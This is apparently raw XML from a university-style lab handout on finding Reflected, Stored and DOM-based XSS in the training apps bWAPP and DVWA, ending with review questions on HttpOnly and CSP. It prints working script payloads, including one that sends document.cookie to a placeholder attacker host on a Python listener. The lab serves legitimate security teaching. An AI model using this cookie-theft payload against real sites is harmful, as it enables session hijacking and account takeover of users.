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12</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F172A"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>IDENTIFY XSS VULNERABILITIES IN WEB APPLICATIONS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identify and demonstrate Reflected, Stored, and DOM-based Cross-Site Scripting (XSS) vulnerabilities and execute a session cookie theft attack.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Cross-Site Scripting (XSS) occurs when unsanitized user input is rendered in web pages, allowing attackers to execute arbitrary JavaScript code in victim browsers.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Kali Linux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bWAPP / DVWA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Browser DevTools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Python Listener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Execute Reflected XSS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Normal"/>
        <w:spacing w:lineRule="auto" w:line="276" w:before="0" w:after="80"/>
        <w:rPr/>
      </w:pPr>
      <w:r>
        <w:rPr/>
        <w:t>Submit script payload in search form field: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&lt;script&gt;alert('Reflected-XSS-Test')&lt;/script&gt;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Execute Stored XSS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Normal"/>
        <w:spacing w:lineRule="auto" w:line="276" w:before="0" w:after="80"/>
        <w:rPr/>
      </w:pPr>
      <w:r>
        <w:rPr/>
        <w:t>Submit script payload in comment section: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&lt;script&gt;alert('Stored-XSS-Test')&lt;/script&gt;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Demonstrate Cookie Theft via XSS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Normal"/>
        <w:spacing w:lineRule="auto" w:line="276" w:before="0" w:after="80"/>
        <w:rPr/>
      </w:pPr>
      <w:r>
        <w:rPr/>
        <w:t>Start HTTP listener on Kali and inject cookie exfiltration payload into comment form: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python3 -m http.server 8000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&lt;script&gt;document.location='http://&lt;kali-ip&gt;:8000/steal?c='+document.cookie&lt;/script&gt;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Execute DOM-based XSS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Normal"/>
        <w:spacing w:lineRule="auto" w:line="276" w:before="0" w:after="80"/>
        <w:rPr/>
      </w:pPr>
      <w:r>
        <w:rPr/>
        <w:t>Inject payload into client-side DOM input parameter processed by JavaScript document.write() functions.</w:t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31921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Execution of JavaScript alert popups for Reflected/Stored XSS, and captured session cookies displayed in Kali HTTP listener log.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="0F172A"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t>7.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What is the core difference between Stored and Reflected XSS?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Reflected XSS payload is immediately returned in response to single request. Stored XSS payload is saved in database and executed for all visitors.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Why is DOM-based XSS harder to detect with server-side filtering?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DOM XSS executes entirely on client browser via JS DOM sources/sinks, never reaching backend server filters.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What HTTP header can reduce the impact of a stolen cookie? (HttpOnly)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The Set-Cookie: HttpOnly attribute prevents client-side JavaScript from accessing document.cookie.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What is Content Security Policy (CSP), and how does it help against XSS?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CSP header restricts trusted domains for script execution, disabling inline scripts (unsafe-inline).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Can XSS lead to a full account takeover? Explain how.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Yes. Attackers can steal session cookies, capture passwords, or issue AJAX requests to change account credentials.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325</Words>
  <Characters>1997</Characters>
  <CharactersWithSpaces>2280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2026-10-06T20:08:23Z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